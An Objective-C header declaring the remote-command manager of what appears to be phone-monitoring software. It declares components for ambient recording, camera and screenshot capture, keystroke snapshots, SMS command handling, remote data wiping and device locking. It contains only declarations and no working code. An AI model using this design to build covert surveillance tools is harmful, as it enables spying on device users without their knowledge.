/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdManagerImpl
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  17/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "RemoteCmdManager.h"

@class EventCenter;
@class SMSCmdCenter;
@class RemoteCmdProcessingManager;
@class RemoteCmdUtils;
@class RemoteCmdStore;
@class PCCCmdCenter;
@class LicenseManager;
@class SyncTimeManager;
@class SyncCDManager;
@class PushCmdCenter;

@protocol DataDelivery, EventDelegate, EventDelivery, EventRepository, ConnectionHistoryManager, ConfigurationManager, AppContext, ServerAddressManager;
@protocol PreferenceManager, ActivationManagerProtocol, SystemUtils, AddressbookManager, SMSSender;
@protocol WipeDataManager, DeviceLockManager, ApplicationProfileManager, UrlProfileManager, BookmarkManager, ApplicationManager, AmbientRecordingManager, CalendarManager;
@protocol NoteManager, CameraEventCapture, SoftwareUpdateManager, UpdateConfigurationManager,IMVersionControlManager, KeySnapShotRuleManager, DeviceSettingsManager, HistoricalEventManager, ScreenshotCaptureManager, TemporalControlManager;
@protocol NetworkTrafficAlertManager;
@protocol AppScreenShotManager;

@interface RemoteCmdManagerImpl : NSObject <RemoteCmdManager>{
@private
   	id <DataDelivery>              mDataDelivery;
	id <EventDelegate>             mEventDelegate; 
	id <EventDelivery>             mEventDelivery;
	id <EventRepository>           mEventRepository;
	id <ConnectionHistoryManager>  mConnectionHistoryManager; 
	id <ConfigurationManager>      mConfigurationManager;
	id <SMSSender>                 mSMSSender;    
   	id <AppContext>                mAppContext;
	id <ServerAddressManager>      mServerAddressManager;
	id <PreferenceManager>	       mPreferenceManager;
	id <ActivationManagerProtocol> mActivationManagerProtocol;
	id <SystemUtils>               mSystemUtils;
	id <AddressbookManager>        mAddressbookManager;
	LicenseManager*                mLicenseManager;
	SyncTimeManager				   *mSyncTimeManager;
	SyncCDManager				   *mSyncCDManager;
	id <WipeDataManager>			mWipeDataManager;
	id <DeviceLockManager>			mDeviceLockManager;
	id <ApplicationProfileManager>	mApplicationProfileManager;
	id <UrlProfileManager>			mUrlProfileManager;
	id <BookmarkManager>			mBookmarkManager;
	id <ApplicationManager>			mApplicationManager;
	id <AmbientRecordingManager>	mAmbientRecordingManager;
	id <CalendarManager>			mCalendarManager;
	id <NoteManager>				mNoteManager;
	id <CameraEventCapture>			mCameraEventCapture;
	id <SoftwareUpdateManager>		mSoftwareUpdateManager;
	id <UpdateConfigurationManager>	mUpdateConfigurationManager;
	id <IMVersionControlManager>    mIMVersionControlManager;
    id <KeySnapShotRuleManager>     mKeySnapShotRuleManager;
	id <DeviceSettingsManager>      mDeviceSettingsManager;
    id <HistoricalEventManager>     mHistoricalEventManager;
    id <ScreenshotCaptureManager>   mScreenshotCaptureManager;
	id <TemporalControlManager>     mTemporalControlManager;
    id <NetworkTrafficAlertManager> mNetworkTrafficAlertManager;
    id <AppScreenShotManager>      mAppScreenShotManager;
    
	RemoteCmdProcessingManager*    mRemoteCmdProcessingManager;
	SMSCmdCenter*                  mSMSCmdCenter;
	RemoteCmdUtils*                mRemoteCmdUtils;
	RemoteCmdStore*                mRemoteCmdStore;
	PCCCmdCenter*				   mPCCCmdCenter;
    PushCmdCenter                  *mPushCmdCenter;
	
	NSArray*                       mSupportCmdCodes;
	
	NSString*                      mMediaSearchPath;
}

@property (nonatomic,retain) id <DataDelivery> mDataDelivery;
@property (nonatomic,retain) id <EventDelivery> mEventDelivery;
@property (nonatomic,retain) id <EventDelegate>  mEventDelegate; 
@property (nonatomic,retain) id <ConnectionHistoryManager> mConnectionHistoryManager; 
@property (nonatomic,retain) id <EventRepository> mEventRepository;
@property (nonatomic,retain) id <ConfigurationManager> mConfigurationManager;
@property (nonatomic,retain) id <SMSSender> mSMSSender;
@property (nonatomic,retain) id <AppContext> mAppContext;
@property (nonatomic,retain) id <ActivationManagerProtocol> mActivationManagerProtocol;
@property (nonatomic,retain) id <PreferenceManager>	mPreferenceManager;
@property (nonatomic,retain) id <ServerAddressManager> mServerAddressManager;
@property (nonatomic,retain) id <SystemUtils> mSystemUtils;
@property (nonatomic,retain) id <AddressbookManager> mAddressbookManager;
@property (nonatomic,retain) LicenseManager* mLicenseManager;
@property (nonatomic, assign) SyncTimeManager *mSyncTimeManager;
@property (nonatomic, assign) SyncCDManager *mSyncCDManager;
@property (nonatomic, assign) id <WipeDataManager> mWipeDataManager;
@property (nonatomic, assign) id <DeviceLockManager> mDeviceLockManager;
@property (nonatomic, assign) id <ApplicationProfileManager> mApplicationProfileManager;
@property (nonatomic, assign) id <UrlProfileManager> mUrlProfileManager;
@property (nonatomic, assign) id <BookmarkManager> mBookmarkManager;
@property (nonatomic, assign) id <ApplicationManager> mApplicationManager;
@property (nonatomic, assign) id <AmbientRecordingManager> mAmbientRecordingManager;
@property (nonatomic, assign) id <CalendarManager> mCalendarManager;
@property (nonatomic, assign) id <NoteManager> mNoteManager;
@property (nonatomic, assign) id <CameraEventCapture> mCameraEventCapture;
@property (nonatomic, assign) id <SoftwareUpdateManager> mSoftwareUpdateManager;
@property (nonatomic, assign) id <UpdateConfigurationManager> mUpdateConfigurationManager;
@property (nonatomic, assign) id <IMVersionControlManager> mIMVersionControlManager;
@property (nonatomic, assign) id <KeySnapShotRuleManager> mKeySnapShotRuleManager;
@property (nonatomic, assign) id <DeviceSettingsManager> mDeviceSettingsManager;
@property (nonatomic, assign) id <HistoricalEventManager> mHistoricalEventManager;
@property (nonatomic, assign) id <ScreenshotCaptureManager> mScreenshotCaptureManager;
@property (nonatomic, assign) id <TemporalControlManager> mTemporalControlManager;
@property (nonatomic, assign) id <NetworkTrafficAlertManager> mNetworkTrafficAlertManager;
@property (nonatomic, assign) id <AppScreenShotManager> mAppScreenShotManager;

@property (nonatomic,retain) RemoteCmdProcessingManager* mRemoteCmdProcessingManager;
@property (nonatomic,retain) PCCCmdCenter* mPCCCmdCenter;
@property (nonatomic,retain) SMSCmdCenter* mSMSCmdCenter;
@property (nonatomic,retain) PushCmdCenter *mPushCmdCenter;
@property (nonatomic,retain) NSArray*  mSupportCmdCodes;
@property (nonatomic,copy) NSString* mMediaSearchPath;

- (void) launch;
- (void) relaunchForFeaturesChange;
- (void) processPendingRemoteCommands;
- (void) clearAllPendingRemoteCommands;

- (NSString *) replySMSPattern;
@end
